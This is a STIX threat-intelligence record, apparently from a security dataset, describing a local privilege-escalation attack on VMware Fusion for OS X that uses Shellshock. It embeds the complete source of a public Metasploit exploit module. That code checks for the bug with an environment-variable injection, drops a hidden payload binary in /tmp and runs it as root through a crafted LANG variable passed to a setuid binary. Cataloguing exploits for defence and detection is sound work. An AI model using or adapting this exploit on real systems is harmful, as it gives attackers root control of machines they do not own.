{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--18959606-fe98-4c68-bcf4-835ad871e456",
    "created": "2024-08-14T16:34:47.65171Z",
    "modified": "2024-08-14T16:34:47.651714Z",
    "name": "OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)",
    "description": " This module exploits the Shellshock vulnerability, a flaw in how the Bash shell handles external environment variables. This module targets the VMWare Fusion application, allowing an unprivileged local user to get root access.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/vmware_bash_function_root.rb",
            "external_id": "vmware_bash_function_root.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6271"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)',\n      'Description'   => %q{\n        This module exploits the Shellshock vulnerability, a flaw in how the Bash shell\n        handles external environment variables. This module targets the VMWare Fusion\n        application, allowing an unprivileged local user to get root access.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        =>\n        [\n          'Stephane Chazelas', # discovered the bash bug\n          'juken', # discovered the VMWare priv esc\n          'joev', # msf module\n          'mubix' # vmware-vmx-stats\n        ],\n      'References'    =>\n        [\n          [ 'CVE', '2014-6271' ],\n          [ 'CWE', '94' ],\n          [ 'OSVDB', '112004' ],\n          [ 'EDB', '34765' ]\n        ],\n      'Platform'      => 'osx',\n      'Arch'          => [ ARCH_X64 ],\n      'SessionTypes'  => [ 'shell', 'meterpreter' ],\n      'Targets'       => [\n        [ 'Mac OS X 10.9 Mavericks x64 (Native Payload)',\n          {\n            'Platform' => 'osx',\n            'Arch' => ARCH_X64\n          }\n        ]\n      ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2014-09-24',\n      'Notes' =>\n          {\n              'AKA' => ['Shellshock']\n          }\n    ))\n\n    register_options [\n      OptString.new('VMWARE_PATH', [true, \"The path to VMware.app\", '/Applications/VMware Fusion.app']),\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'Writable directory', '/tmp'])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def check\n    check_str = Rex::Text.rand_text_alphanumeric(5)\n    # ensure they are vulnerable to bash env variable bug\n    if cmd_exec(\"env x='() { :;}; echo #{check_str}' bash -c echo\").include?(check_str) &&\n       cmd_exec(\"file '#{datastore['VMWARE_PATH']}'\") !~ /cannot open/\n\n      CheckCode::Vulnerable\n    else\n      CheckCode::Safe\n    end\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    if check != CheckCode::Vulnerable\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    payload_file = \"#{base_dir}/.#{Rex::Text::rand_text_alpha_lower(8..12)}\"\n    exe = Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)\n    upload payload_file, exe\n    cmd_exec \"chmod +x #{payload_file}\"\n\n    print_status 'Running VMWare services...'\n    path = '/Contents/Library/vmware-vmx-stats' # path to the suid binary\n    cmd_exec(\"LANG='() { :;}; #{payload_file}' '#{datastore['VMWARE_PATH']}#{path}' /dev/random\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-09-24",
    "x_mitre_platforms": [
        "osx'"
    ]
}